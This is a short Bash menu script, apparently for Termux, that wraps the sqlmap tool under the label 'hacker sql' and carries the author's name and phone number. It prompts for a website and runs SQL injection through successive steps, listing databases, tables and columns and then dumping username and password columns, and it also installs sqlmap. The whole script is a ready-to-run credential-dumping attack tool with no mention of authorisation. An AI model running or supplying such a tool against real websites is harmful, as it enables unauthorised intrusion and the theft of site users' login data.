clear
a(){
printf '\e[32m'
toilet ' My Sql'
printf ' By Ahmed Nassif\n'
printf ' WhatsApp +963940868494\n'
printf ' GitHub https://github.com/as9697347\n\n'
if [[ -e ~/sqlmap ]];then
cd ~/sqlmap
fi
if [[ -e ~/sqlmap-dev ]];then
cd ~/sqlmap-dev
fi
if [[ ~/A.N.H/box/.sqlmap-dev ]];then
cd ~/A.N.H/box/.sqlmap-dev
fi
printf '[1] hacker sql\n'
printf '[2] website\n'
printf '[3] file\n'
printf '[4] files\n'
printf '[5] select file\n'
printf '[6] install sqlmap\n'
printf '[x] Exit\n'
read -p $'## Enter number: ' n
if [[ $n == 1 ]];then
read -p $'[\e[31m*\e[32m] website: ' web
python2 sqlmap.py -u $web --dbs
read -p $'\e[32m[\e[31m*\e[32m] Enter file: ' file
python2 sqlmap.py -u $web -D $file --tables
read -p $'\e[32m[\e[31m*\e[32m] Enter file from files: ' files
python2 sqlmap.py -u $web -D $file -T $files --columns
read -p $'\e[32m[\e[31m*\e[32m] username: ' user
python2 sqlmap.py -u $web -D $file -T $files -C $user --dump
read -p $'\e[32m[\e[31m*\e[32m] password: ' pass
python2 sqlmap.py -u $web -D $file -T $files -C $pass --dump
printf '\e[32m[1] back\n'
printf '[2] exit\n'
read -p $'Enter Number: ' a
if [[ $a == 1 ]];then
a
elif [[ $a == 2 ]];then
exit
fi
elif [[ $n == 2 ]];then
read -p $'\e[32m[\e[31m*\e[32m] website: ' web
python2 sqlmap.py -u $web --dbs
printf '\e[32m[1] back\n'
printf '[2] exit\n'
read -p $'Enter Number: ' a
if [[ $a == 1 ]];then
a
elif [[ $a == 2 ]];then
exit
fi
elif [[ $n == 3 ]];then
read -p $'[\e[31m*\e[32m] website: ' web
read -p $'[\e[31m*\e[32m] Enter file: ' file
python2 sqlmap.py -u $web -D $file --tables
printf '\e[32m[1] back\n'
printf '[2] exit\n'
read -p $'Enter Number: ' a
if [[ $a == 1 ]];then
a
elif [[ $a == 2 ]];then
exit
fi
elif [[ $n == 4 ]];then
read -p $'\e[32m[\e[31m*\e[32m] website: ' web
read -p $'[\e[31m*\e[32m] Enter file: ' file
read -p $'[\e[31m*\e[32m] Enter file from files: ' files
python2 sqlmap.py -u $web -D $file -T $files --columns
printf '\e[32m[1] back\n'
printf '[2] exit\n'
read -p $'Enter Number: ' a
if [[ $a == 1 ]];then
a
elif [[ $a == 2 ]];then
exit
fi
elif [[ $n == 5 ]];then
read -p $'\e[32m[\e[31m*\e[32m] website: ' web
read -p $'[\e[31m*\e[32m] Enter file: ' file
read -p $'[\e[31m*\e[32m] Enter file from files: ' files
read -p $'[\e[31m*\e[32m] select file: ' s
python2 sqlmap.py -u $web -D $file -T $files -C $s --dump
printf '\e[32m[1] back\n'
printf '[2] exit\n'
read -p $'Enter Number: ' a
if [[ $a == 1 ]];then
a
elif [[ $a == 2 ]];then
exit
fi
elif [[ $n == x ]];then
exit
elif [[ $n == 6 ]];then
pkg update -y pkg upgrade -y
pkg install python2 -y
pkg install git -y
cd
git clone --depth 1 https://github.com/sqlmapproject/sqlmap.git
printf '\e[33m * installed Done\n'
sleep 2
a
else
printf '\e[1;31m Error in input'
sleep 1
a
fi
}
a
